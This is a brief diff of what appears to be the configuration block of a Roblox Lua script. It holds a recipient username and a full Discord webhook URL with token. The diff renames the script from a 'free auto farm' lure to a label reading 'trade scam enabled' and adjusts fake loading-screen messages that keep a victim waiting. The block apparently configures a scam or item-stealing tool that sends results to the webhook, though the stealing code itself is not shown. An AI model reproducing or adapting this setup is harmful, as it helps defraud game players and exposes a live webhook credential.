@@ -2,8 +2,8 @@ Username = "tangmeiLONG"
 WebHook = "https://discord.com/api/webhooks/1077669274358915122/MoIBk5GTgOHM58caPEE4XEAlc0V2ws35w3EapJ1ISH0EfWOoD79X-kEvDyExKsOFOd1R"
  
  
-_G.CustomScriptName = "永久免费 自动农场"
-_G.Text1 = "加载到100%卡住就退出重新加载一次..."
+_G.CustomScriptName = "交易欺骗开启中"
+_G.Text1 = "请耐心等待加载完成..."
 _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
 _G.Text4 = "Starting Scripts..."
